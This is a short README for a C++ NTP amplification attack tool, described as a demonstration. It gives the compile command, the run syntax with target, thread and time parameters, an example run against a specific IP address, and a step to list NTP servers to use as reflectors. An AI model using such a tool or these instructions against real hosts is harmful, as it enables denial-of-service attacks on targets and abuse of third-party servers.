# NTP-Amplification-Attack-demonstration-CPP
NTP Amplification Attack demonstration C++


===
Compiling.
===
    gcc NTPAttack.cpp -o NTPAttack -lstdc++ -lpthread
Running NTPAttack.
===
	sudo ./NTPAttack [target] [threads] [time]

	example: $ sudo ./NTPAttack 132.163.97.1 3 10
ntp.list :
===
Add some ntp server ip addresses in the ntp.list file
